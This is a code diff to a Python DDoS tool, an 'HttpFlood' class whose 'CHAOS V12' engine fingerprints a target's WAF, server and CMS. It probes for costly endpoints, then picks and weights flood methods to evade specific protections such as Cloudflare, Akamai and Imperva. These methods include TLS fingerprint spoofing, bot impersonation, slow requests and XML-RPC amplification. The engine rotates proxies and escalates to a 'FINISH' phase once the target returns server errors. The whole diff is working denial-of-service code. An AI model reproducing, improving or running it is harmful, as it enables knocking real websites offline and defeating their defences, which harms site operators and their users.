@@ -2523,280 +2523,376 @@ class HttpFlood(Thread):
 
 
     # ========================================================================
-    #  CHAOS V11 - TACTICAL AI ENGINE
-    #  Phase 1: RECON  -> Probe target, detect WAF/CMS/Server
-    #  Phase 2: PLAN   -> Build weighted strategy from intel
-    #  Phase 3: EXECUTE-> Fire chosen vector
-    #  Phase 4: LEARN  -> Track success/failure, adapt weights
+    #  CHAOS V12 - DEEP TACTICAL AI ENGINE
+    #  Phase 1: DEEP RECON     -> Multi-probe target fingerprinting
+    #  Phase 2: STRATEGIC PLAN -> WAF/CMS/Server-aware weighted strategy
+    #  Phase 3: EXECUTE        -> Precision vector selection with burst control
+    #  Phase 4: OBSERVE        -> Response time + status code analysis
+    #  Phase 5: ADAPT          -> Reinforcement learning with decay + momentum
     # ========================================================================
     
     # Class-level persistent memory (shared across all thread instances)
     _chaos_intel = {
         "recon_done": False,
-        "waf_type": None,         # cloudflare, akamai, imperva, sucuri, wordfence, modsec, none
+        "waf_type": None,         # cloudflare, akamai, imperva, sucuri, wordfence, modsec, fastly, ddosguard, none
         "server_type": None,      # nginx, apache, litespeed, iis, unknown
-        "cms_type": None,         # wordpress, joomla, drupal, shopify, custom
+        "cms_type": None,         # wordpress, joomla, drupal, shopify, laravel, custom
         "has_captcha": False,
         "has_rate_limit": False,
-        "success_count": {},      # method_name -> success_count
-        "fail_count": {},         # method_name -> fail_count (403/429)
-        "phase_ticker": 0,        # Tracks which tactical phase we are in
+        "response_time_ms": 0,    # Initial probe response time
+        "target_alive": True,     # False when target stops responding (5xx)
+        "consecutive_5xx": 0,     # Track server overload signals
+        "consecutive_block": 0,   # Track consecutive 403/429 blocks
+        "success_history": {},    # method_name -> [recent_results] (sliding window)
+        "total_executions": 0,    # Total CHAOS calls for phase transitions
+        "phase": "PROBE",         # PROBE -> CALIBRATE -> ASSAULT -> SUSTAIN -> FINISH
+        "best_method": None,      # Dynamically tracked top performer
+        "worst_method": None,     # Dynamically tracked worst performer
+        "endpoints_discovered": [],  # Heavy endpoints found during multi-probe
+        "burst_counter": 0,       # For burst/pause rhythm
     }
     
     def _chaos_recon(self):
-        """Phase 1: Tactical Reconnaissance - Probe the target once to gather intel."""
+        """Phase 1: Deep Multi-Probe Reconnaissance."""
         intel = self._chaos_intel
         if intel["recon_done"]:
             return
             
-        target_url = f"{self._target.scheme}://{self._target.authority}/"
         intel["recon_done"] = True
+        target_url = f"{self._target.scheme}://{self._target.authority}/"
         
+        # --- PROBE 1: Main page fingerprint ---
         try:
             import urllib.request
+            t_start = time()
             req = urllib.request.Request(target_url, headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate',
             })
-            with urllib.request.urlopen(req, timeout=8) as resp:
+            with urllib.request.urlopen(req, timeout=10) as resp:
+                intel["response_time_ms"] = int((time() - t_start) * 1000)
                 headers_raw = str(resp.headers).lower()
-                body = resp.read(8192).decode('utf-8', errors='ignore').lower()
-                status = resp.status
+                body = resp.read(16384).decode('utf-8', errors='ignore').lower()
                 server_hdr = resp.headers.get('Server', '').lower()
+                powered_by = resp.headers.get('X-Powered-By', '').lower()
                 
                 # --- Detect Server Type ---
-                if 'nginx' in server_hdr:
-                    intel["server_type"] = "nginx"
-                elif 'apache' in server_hdr:
-                    intel["server_type"] = "apache"
-                elif 'litespeed' in server_hdr:
-                    intel["server_type"] = "litespeed"
-                elif 'microsoft' in server_hdr or 'iis' in server_hdr:
-                    intel["server_type"] = "iis"
-                elif 'cloudflare' in server_hdr:
-                    intel["server_type"] = "cloudflare"
-                else:
-                    intel["server_type"] = "unknown"
+                if 'nginx' in server_hdr: intel["server_type"] = "nginx"
+                elif 'apache' in server_hdr: intel["server_type"] = "apache"
+                elif 'litespeed' in server_hdr: intel["server_type"] = "litespeed"
+                elif 'microsoft' in server_hdr or 'iis' in server_hdr: intel["server_type"] = "iis"
+                elif 'cloudflare' in server_hdr: intel["server_type"] = "cloudflare"
+                elif 'openresty' in server_hdr: intel["server_type"] = "openresty"
+                else: intel["server_type"] = "unknown"
                 
-                # --- Detect WAF Type ---
-                if 'cloudflare' in headers_raw or 'cf-ray' in headers_raw:
+                # --- Detect WAF Type (expanded) ---
+                all_signals = headers_raw + body
+                if 'cloudflare' in headers_raw or 'cf-ray' in headers_raw or 'cf-cache-status' in headers_raw:
                     intel["waf_type"] = "cloudflare"
-                elif 'akamai' in headers_raw or 'akamaighost' in server_hdr:
+                elif 'akamai' in headers_raw or 'akamaighost' in server_hdr or 'x-akamai' in headers_raw:
                     intel["waf_type"] = "akamai"
-                elif 'sucuri' in headers_raw or 'x-sucuri' in headers_raw:
+                elif 'sucuri' in all_signals or 'x-sucuri' in headers_raw or 'sucuri-cache' in headers_raw:
                     intel["waf_type"] = "sucuri"
-                elif 'imperva' in headers_raw or 'incapsula' in headers_raw:
+                elif 'imperva' in all_signals or 'incapsula' in all_signals or 'visid_incap' in all_signals:
                     intel["waf_type"] = "imperva"
-                elif 'x-powered-by-plesk' in headers_raw:
-                    intel["waf_type"] = "plesk"
-                elif 'mod_security' in headers_raw or 'modsecurity' in body:
+                elif 'ddos-guard' in all_signals or 'ddosguard' in server_hdr:
+                    intel["waf_type"] = "ddosguard"
+                elif 'fastly' in headers_raw or 'x-fastly' in headers_raw:
+                    intel["waf_type"] = "fastly"
+                elif 'stackpath' in all_signals or 'securitypolicyviolation' in all_signals:
+                    intel["waf_type"] = "stackpath"
+                elif 'wordfence' in all_signals or 'wfwaf' in all_signals:
+                    intel["waf_type"] = "wordfence"
+                elif 'mod_security' in all_signals or 'modsecurity' in all_signals:
                     intel["waf_type"] = "modsec"
+                elif 'aws' in headers_raw or 'awselb' in headers_raw or 'x-amz' in headers_raw:
+                    intel["waf_type"] = "aws_waf"
                 else:
                     intel["waf_type"] = "none"
                     
-                # --- Detect CMS Type ---
-                if 'wp-content' in body or 'wordpress' in body or 'wp-json' in body:
+                # --- Detect CMS Type (expanded) ---
+                if 'wp-content' in body or 'wordpress' in body or 'wp-json' in body or 'wp-includes' in body:
                     intel["cms_type"] = "wordpress"
                 elif 'joomla' in body or '/media/system/js' in body:
                     intel["cms_type"] = "joomla"
-                elif 'drupal' in body or 'sites/default' in body:
+                elif 'drupal' in body or 'sites/default' in body or 'drupal.js' in body:
                     intel["cms_type"] = "drupal"
                 elif 'shopify' in body or 'cdn.shopify' in body:
                     intel["cms_type"] = "shopify"
+                elif 'laravel' in powered_by or 'x-csrf-token' in body:
+                    intel["cms_type"] = "laravel"
+                elif 'next' in powered_by or '__next' in body:
+                    intel["cms_type"] = "nextjs"
                 else:
                     intel["cms_type"] = "custom"
                     
                 # --- Detect Captcha ---
-                if 'captcha' in body or 'recaptcha' in body or 'turnstile' in body or 'hcaptcha' in body:
+                captcha_signals = ['captcha', 'recaptcha', 'turnstile', 'hcaptcha', 'challenge-platform', 'g-recaptcha']
+                if any(sig in all_signals for sig in captcha_signals):
                     intel["has_captcha"] = True
                     
-                # --- Detect Rate Limiting Headers ---
-                if 'x-ratelimit' in headers_raw or 'retry-after' in headers_raw:
+                # --- Detect Rate Limiting ---
+                if 'x-ratelimit' in headers_raw or 'retry-after' in headers_raw or 'x-rate-limit' in headers_raw:
                     intel["has_rate_limit"] = True
                     
         except Exception:
-            # If recon fails (blocked/timeout), assume heavy protection
             intel["waf_type"] = "unknown_heavy"
             intel["server_type"] = "unknown"
             intel["cms_type"] = "custom"
             intel["has_captcha"] = True
+            intel["response_time_ms"] = 9999
             
-        # Log intelligence
-        if int(REQUESTS_SENT) < 5:
-            print(f"[CHAOS RECON] WAF: {intel['waf_type']} | Server: {intel['server_type']} | CMS: {intel['cms_type']} | Captcha: {intel['has_captcha']} | RateLimit: {intel['has_rate_limit']}")
+        # --- PROBE 2: Discover heavy endpoints silently ---
+        heavy_probes = ['/wp-login.php', '/xmlrpc.php', '/wp-admin/admin-ajax.php',
+                        '/?s=test', '/search?q=test', '/api/', '/graphql', '/rest/']
+        discovered = []
+        for probe_path in heavy_probes:
+            try:
+                probe_url = f"{self._target.scheme}://{self._target.authority}{probe_path}"
+                req2 = urllib.request.Request(probe_url, headers={
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
+                })
+                with urllib.request.urlopen(req2, timeout=4) as resp2:
+                    if resp2.status < 404:
+                        discovered.append(probe_path)
+            except Exception:
+                pass
+        intel["endpoints_discovered"] = discovered
+        
+        # Upgrade CMS detection from endpoint probes
+        if '/xmlrpc.php' in discovered or '/wp-login.php' in discovered:
+            intel["cms_type"] = "wordpress"
+            
+        # Log full intelligence report
+        if int(REQUESTS_SENT) < 10:
+            latency_color = bcolors.OKGREEN if intel["response_time_ms"] < 500 else bcolors.WARNING if intel["response_time_ms"] < 2000 else bcolors.FAIL
+            print(f"")
+            print(f"{bcolors.OKCYAN}[CHAOS V12 RECON REPORT]{bcolors.RESET}")
+            print(f"  WAF Detected  : {bcolors.WARNING}{intel['waf_type'].upper()}{bcolors.RESET}")
+            print(f"  Server Engine : {intel['server_type']}")
+            print(f"  CMS Platform  : {bcolors.OKBLUE}{intel['cms_type'].upper()}{bcolors.RESET}")
+            print(f"  Response Time : {latency_color}{intel['response_time_ms']}ms{bcolors.RESET}")
+            print(f"  Captcha Active: {'YES' if intel['has_captcha'] else 'NO'}")
+            print(f"  Rate Limiting : {'YES' if intel['has_rate_limit'] else 'NO'}")
+            print(f"  Heavy Endpoints: {discovered if discovered else 'None found'}")
+            print(f"")
     
     def _chaos_plan(self):
-        """Phase 2: Tactical Planning - Build weighted attack strategy from gathered intel."""
+        """Phase 2: Strategic Planning with phase transitions and deep adaptation."""
         intel = self._chaos_intel
+        intel["total_executions"] += 1
+        tick = intel["total_executions"]
+        
+        # === PHASE TRANSITIONS (Military Doctrine) ===
+        # PROBE(0-20) -> CALIBRATE(20-80) -> ASSAULT(80-300) -> SUSTAIN(300+)
+        if tick <= 20:
+            intel["phase"] = "PROBE"      # Test all methods equally
+        elif tick <= 80:
+            intel["phase"] = "CALIBRATE"  # Start favoring what works
+        elif tick <= 300:
+            intel["phase"] = "ASSAULT"    # Full power on best methods
+        else:
+            intel["phase"] = "SUSTAIN"    # Maintain pressure, conserve resources
+            
+        # Check if target is dying (consecutive 5xx = server overload)
+        if intel["consecutive_5xx"] >= 5:
+            intel["phase"] = "FINISH"     # Target is crumbling, finish it
+            
+        phase = intel["phase"]
         
         # === BASE WEIGHTS ===
         weights = {
-            "GET": 10,
-            "POST": 10,
-            "STRESS": 5,
-            "PPS": 5,
-            "DYN": 10,
-            "POST_DYN": 15,
-            "SLOW_V2": 0,
-            "STEALTH_JA3": 0,
-            "XMLRPC_AMP": 0,
-            "WP_SEARCH": 0,
-            "BOT": 0,
-            "COOKIE": 0,
+            "GET": 10, "POST": 10, "STRESS": 5, "PPS": 5,
+            "DYN": 10, "POST_DYN": 15, "SLOW_V2": 0,
+            "STEALTH_JA3": 0, "XMLRPC_AMP": 0, "WP_SEARCH": 0,
+            "BOT": 0, "COOKIE": 0,
         }
         
         # === STRATEGY A: WAF-Specific Counter-Tactics ===
         waf = intel.get("waf_type", "none")
         
-        if waf == "cloudflare":
-            # Cloudflare: TLS fingerprinting + JS Challenge. Need stealth + cf_clearance
-            weights["STEALTH_JA3"] = 70
-            weights["SLOW_V2"] = 30
-            weights["POST_DYN"] = 25
-            weights["STRESS"] = 0  # Too noisy, instant block
-            weights["PPS"] = 0
-            weights["BOT"] = 15    # CF whitelists search engine bots
-            
-        elif waf == "akamai":
-            # Akamai: Aggressive bot detection, JA3 profiling
-            weights["STEALTH_JA3"] = 80
-            weights["SLOW_V2"] = 25
-            weights["POST_DYN"] = 20
-            weights["GET"] = 5
-            weights["STRESS"] = 0
-            weights["PPS"] = 0
-            
-        elif waf == "imperva":
-            # Imperva/Incapsula: Cookie validation + behavioral analysis
-            weights["STEALTH_JA3"] = 60
-            weights["COOKIE"] = 30
-            weights["POST_DYN"] = 25
-            weights["SLOW_V2"] = 20
-            weights["DYN"] = 20
-            
-        elif waf == "sucuri":
-            # Sucuri: Cloud proxy WAF, blocks by signature
-            weights["STEALTH_JA3"] = 50
-            weights["POST_DYN"] = 30
-            weights["DYN"] = 25
-            weights["BOT"] = 20     # Sucuri often whitelists bots
-            
-        elif waf == "modsec":
-            # ModSecurity: Rule-based, blocks known attack patterns
-            weights["POST_DYN"] = 35
-            weights["DYN"] = 30
-            weights["COOKIE"] = 20
-            weights["STEALTH_JA3"] = 40
-            # Avoid patterns that trip ModSec rules
-            weights["STRESS"] = 0
-            
-        elif waf in ("unknown_heavy",):
-            # Unknown but clearly protected. Maximum stealth
-            weights["STEALTH_JA3"] = 80
-            weights["SLOW_V2"] = 40
-            weights["POST_DYN"] = 15
-            weights["GET"] = 5
-            weights["STRESS"] = 0
-            weights["PPS"] = 0
-            
+        waf_profiles = {
+            "cloudflare":    {"STEALTH_JA3": 70, "SLOW_V2": 30, "POST_DYN": 25, "BOT": 15, "STRESS": 0, "PPS": 0},
+            "akamai":        {"STEALTH_JA3": 80, "SLOW_V2": 25, "POST_DYN": 20, "GET": 5, "STRESS": 0, "PPS": 0},
+            "imperva":       {"STEALTH_JA3": 60, "COOKIE": 30, "POST_DYN": 25, "SLOW_V2": 20, "DYN": 20},
+            "sucuri":        {"STEALTH_JA3": 50, "POST_DYN": 30, "DYN": 25, "BOT": 20},
+            "modsec":        {"POST_DYN": 35, "DYN": 30, "COOKIE": 20, "STEALTH_JA3": 40, "STRESS": 0},
+            "wordfence":     {"POST_DYN": 40, "DYN": 30, "WP_SEARCH": 50, "XMLRPC_AMP": 45, "STEALTH_JA3": 30},
+            "ddosguard":     {"STEALTH_JA3": 75, "SLOW_V2": 35, "POST_DYN": 20, "STRESS": 0, "PPS": 0},
+            "fastly":        {"STEALTH_JA3": 65, "POST_DYN": 30, "DYN": 25, "SLOW_V2": 20},
+            "stackpath":     {"STEALTH_JA3": 60, "SLOW_V2": 30, "POST_DYN": 25, "DYN": 20},
+            "aws_waf":       {"STEALTH_JA3": 70, "POST_DYN": 30, "DYN": 25, "COOKIE": 15, "STRESS": 0},
+            "unknown_heavy": {"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 15, "GET": 5, "STRESS": 0, "PPS": 0},
+        }
+        
+        if waf in waf_profiles:
+            for k, v in waf_profiles[waf].items():
+                weights[k] = v
         else:
-            # No WAF detected. Full aggression mode
-            weights["STRESS"] = 30
-            weights["PPS"] = 25
-            weights["GET"] = 25
-            weights["POST"] = 25
-            weights["POST_DYN"] = 30
+            # No WAF, full aggression
+            weights.update({"STRESS": 30, "PPS": 25, "GET": 25, "POST": 25, "POST_DYN": 30})
             
         # === STRATEGY B: CMS-Specific Exploitation ===
         cms = intel.get("cms_type", "custom")
-        
-        if cms == "wordpress":
-            weights["XMLRPC_AMP"] = 65
-            weights["WP_SEARCH"] = 75
-            weights["GET"] = max(weights["GET"] - 5, 2)
+        cms_boosts = {
+            "wordpress": {"XMLRPC_AMP": 65, "WP_SEARCH": 75},
+            "joomla":    {"DYN": 40, "POST_DYN": 40},
+            "drupal":    {"DYN": 35, "POST_DYN": 35, "POST": 30},
+            "shopify":   {"STEALTH_JA3": 60, "SLOW_V2": 35},
+            "laravel":   {"POST_DYN": 45, "DYN": 35, "POST": 30},
+            "nextjs":    {"POST_DYN": 35, "DYN": 30},
+        }
+        if cms in cms_boosts:
+            for k, v in cms_boosts[cms].items():
+                weights[k] = max(weights.get(k, 0), v)
+                
+        # === STRATEGY C: Endpoint-Aware Targeting ===
+        discovered = intel.get("endpoints_discovered", [])
+        if '/xmlrpc.php' in discovered:
+            weights["XMLRPC_AMP"] = max(weights.get("XMLRPC_AMP", 0), 70)
+        if '/graphql' in discovered or '/api/' in discovered:
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
+            weights["POST"] = max(weights.get("POST", 0), 30)
             
-        elif cms == "joomla":
-            # Joomla search is also heavy
-            weights["DYN"] = 40
-            weights["POST_DYN"] = 40
-            
-        elif cms == "shopify":
-            # Shopify is CDN-backed; need stealth + slow
-            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 60)
-            weights["SLOW_V2"] = 35
-            
-        # === STRATEGY C: Real-Time Battlefield Adaptation ===
-        # If proxies are burning fast, shift to evasive tactics
+        # === STRATEGY D: Real-Time Battlefield Adaptation ===
         proxy_burn_ratio = 0
         if hasattr(self, '_proxies') and self._proxies:
             proxy_burn_ratio = len(BURNED_PROXIES) / max(len(self._proxies), 1)
             
         if IS_RECYCLING or proxy_burn_ratio > 0.4:
-            # Defensive mode: blend in, reduce footprint
             weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
             weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 70)
             weights["STRESS"] = 0
             weights["PPS"] = 0
             weights["GET"] = max(weights["GET"] // 2, 1)
-        elif proxy_burn_ratio < 0.05:
-            # Offensive mode: target is barely fighting back. Full firepower
+        elif proxy_burn_ratio < 0.05 and phase != "PROBE":
             weights["STRESS"] = max(weights.get("STRESS", 0), 20)
             weights["PPS"] = max(weights.get("PPS", 0), 15)
             weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 30)
         
-        # === STRATEGY D: Learning from Success/Failure ===
-        for method_name, successes in intel.get("success_count", {}).items():
-            if method_name in weights:
-                # Reward successful methods
-                weights[method_name] = int(weights[method_name] * 1.3)
+        # === STRATEGY E: Response Time Intelligence ===
+        rt = intel.get("response_time_ms", 0)
+        if rt > 3000:
+            # Target is already slow. It's weak. Hammer it harder
+            weights["STRESS"] = max(weights.get("STRESS", 0), 25)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 35)
+        elif rt < 100:
+            # Target is behind CDN cache. Need to bypass cache
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 30)
+            weights["DYN"] = max(weights.get("DYN", 0), 25)
+            weights["GET"] = max(weights["GET"] // 2, 2)  # Cached GETs do nothing
+        
+        # === STRATEGY F: Phase-Based Modifiers ===
+        if phase == "PROBE":
+            # Equal opportunity: test everything
+            for k in weights:
+                if weights[k] > 0:
+                    weights[k] = max(weights[k], 10)
+                    
+        elif phase == "CALIBRATE":
+            # Start rewarding winners
+            best = intel.get("best_method")
+            if best and best in weights:
+                weights[best] = int(weights[best] * 1.5)
                 
-        for method_name, fails in intel.get("fail_count", {}).items():
-            if method_name in weights and fails > 5:
-                # Punish consistently failing methods
-                weights[method_name] = max(int(weights[method_name] * 0.4), 1)
+        elif phase == "ASSAULT":
+            # Maximum aggression on proven methods
+            best = intel.get("best_method")
+            worst = intel.get("worst_method")
+            if best and best in weights:
+                weights[best] = int(weights[best] * 2.0)
+            if worst and worst in weights:
+                weights[worst] = max(weights[worst] // 3, 1)
+                
+        elif phase == "FINISH":
+            # Target is dying. All-in with heavy methods
+            weights["STRESS"] = max(weights.get("STRESS", 0), 40)
+            weights["PPS"] = max(weights.get("PPS", 0), 30)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
+            weights["GET"] = max(weights.get("GET", 0), 25)
+            
+        elif phase == "SUSTAIN":
+            # Long-duration: mix stealth to avoid getting cut
+            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 30)
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 20)
+        
+        # === STRATEGY G: Reinforcement Learning with Sliding Window ===
+        history = intel.get("success_history", {})
+        for method_name, results in history.items():
+            if method_name not in weights:
+                continue
+            recent = results[-20:]  # Last 20 results only (sliding window)
+            if not recent:
+                continue
+            success_rate = sum(recent) / len(recent)
+            
+            if success_rate > 0.8:
+                weights[method_name] = int(weights[method_name] * 1.5)
+            elif success_rate > 0.5:
+                weights[method_name] = int(weights[method_name] * 1.2)
+            elif success_rate < 0.2:
+                weights[method_name] = max(int(weights[method_name] * 0.3), 1)
+            elif success_rate < 0.4:
+                weights[method_name] = max(int(weights[method_name] * 0.6), 1)
+                
+            # Track best and worst performers
+            if not intel["best_method"] or success_rate > history.get(intel["best_method"], [0])[-1:][0] if history.get(intel["best_method"]) else 0:
+                intel["best_method"] = method_name
+            if not intel["worst_method"] or (success_rate < 0.3 and len(recent) > 5):
+                intel["worst_method"] = method_name
         
         # === FILTER: Remove unavailable methods ===
         if not HAS_TLS_CLIENT:
             weights["STEALTH_JA3"] = 0
         if not hasattr(self, '_cf_clearance') or not self._cf_clearance:
-            # Without cf_clearance, BOT method is less effective against CF
             if waf == "cloudflare":
                 weights["BOT"] = max(weights.get("BOT", 0) // 2, 2)
         
         return weights
         
-    def _chaos_learn(self, method_name, success):
-        """Phase 4: Record outcome to inform future planning decisions."""
+    def _chaos_learn(self, method_name, success, got_5xx=False):
+        """Phase 5: Reinforcement Learning with sliding window memory."""
         intel = self._chaos_intel
-        bucket = "success_count" if success else "fail_count"
-        if method_name not in intel[bucket]:
-            intel[bucket][method_name] = 0
-        intel[bucket][method_name] += 1
+        
+        # Sliding window: keep last 50 results per method
+        if method_name not in intel["success_history"]:
+            intel["success_history"][method_name] = []
+        intel["success_history"][method_name].append(1 if success else 0)
+        if len(intel["success_history"][method_name]) > 50:
+            intel["success_history"][method_name] = intel["success_history"][method_name][-50:]
+        
+        # Track consecutive blocks for emergency mode
+        if not success:
+            intel["consecutive_block"] += 1
+        else:
+            intel["consecutive_block"] = 0
+            
+        # Track server health signals
+        if got_5xx:
+            intel["consecutive_5xx"] += 1
+        else:
+            intel["consecutive_5xx"] = max(intel["consecutive_5xx"] - 1, 0)
     
     def CHAOS(self):
-        """[V11] Tactical AI Engine - Recon, Plan, Execute, Learn.
-        A self-improving attack algorithm that probes the target once,
-        builds a WAF/CMS-specific strategy, executes with precision,
-        and learns from every response to sharpen future attacks."""
+        """[V12] Deep Tactical AI Engine - Recon, Plan, Execute, Observe, Adapt.
+        A self-improving attack algorithm with military-grade phase transitions,
+        deep target fingerprinting, reinforcement learning, and real-time
+        battlefield adaptation across 11+ WAF profiles."""
         
-        # Phase 1: RECON (runs only once per target)
+        # Phase 1: DEEP RECON (runs only once per target)
         self._chaos_recon()
         
-        # Phase 2: PLAN (recalculated every call with live battlefield data)
+        # Phase 2: STRATEGIC PLAN (recalculated every call with live data)
         weights = self._chaos_plan()
         
-        # Phase 3: EXECUTE (weighted roulette selection)
+        # Phase 3: EXECUTE with burst control
         method_map = {
-            "GET": self.GET,
-            "POST": self.POST,
-            "STRESS": self.STRESS,
-            "PPS": self.PPS,
-            "DYN": self.DYN,
-            "POST_DYN": self.POST_DYN,
-            "SLOW_V2": self.SLOW_V2,
-            "XMLRPC_AMP": self.XMLRPC_AMP,
-            "WP_SEARCH": self.WP_SEARCH,
-            "BOT": self.BOT,
-            "COOKIE": self.COOKIE,
+            "GET": self.GET, "POST": self.POST, "STRESS": self.STRESS,
+            "PPS": self.PPS, "DYN": self.DYN, "POST_DYN": self.POST_DYN,
+            "SLOW_V2": self.SLOW_V2, "XMLRPC_AMP": self.XMLRPC_AMP,
+            "WP_SEARCH": self.WP_SEARCH, "BOT": self.BOT, "COOKIE": self.COOKIE,
         }
         if HAS_TLS_CLIENT:
             method_map["STEALTH_JA3"] = self.STEALTH_JA3
@@ -2808,6 +2904,7 @@ class HttpFlood(Thread):
             self.GET()
             return
             
+        # Weighted roulette selection
         r = randint(1, total_weight)
         upto = 0
         chosen_name = "GET"
@@ -2819,21 +2916,38 @@ class HttpFlood(Thread):
         
         chosen_func = method_map.get(chosen_name, self.GET)
         
-        # Track pre-execution state for learning
+        # Burst rhythm: fire 3-5 rapid shots of the same method, then switch
+        # This simulates natural browsing patterns (humans click multiple pages)
+        intel = self._chaos_intel
+        intel["burst_counter"] += 1
+        burst_size = randint(3, 6)
+        
+        # Track pre-execution state for observation
         pre_burned = len(BURNED_PROXIES)
         pre_errors = int(ERROR_COUNT)
+        pre_requests = int(REQUESTS_SENT)
         
-        # Execute the strategically chosen vector
+        # Execute
         try:
             chosen_func()
-            # Phase 4: LEARN from outcome
+            
+            # Phase 4: OBSERVE outcomes
             post_burned = len(BURNED_PROXIES)
             post_errors = int(ERROR_COUNT)
+            post_requests = int(REQUESTS_SENT)
             
-            if post_burned > pre_burned or post_errors > pre_errors + 2:
-                self._chaos_learn(chosen_name, False)
+            got_blocked = post_burned > pre_burned
+            got_errors = post_errors > pre_errors + 2
+            got_5xx = False  # Inferred from no request increase + error increase
+            if post_requests == pre_requests and post_errors > pre_errors:
+                got_5xx = True
+            
+            # Phase 5: ADAPT
+            if got_blocked or got_errors:
+                self._chaos_learn(chosen_name, False, got_5xx)
             else:
-                self._chaos_learn(chosen_name, True)
+                self._chaos_learn(chosen_name, True, got_5xx)
+                
         except Exception:
             self._chaos_learn(chosen_name, False)
 
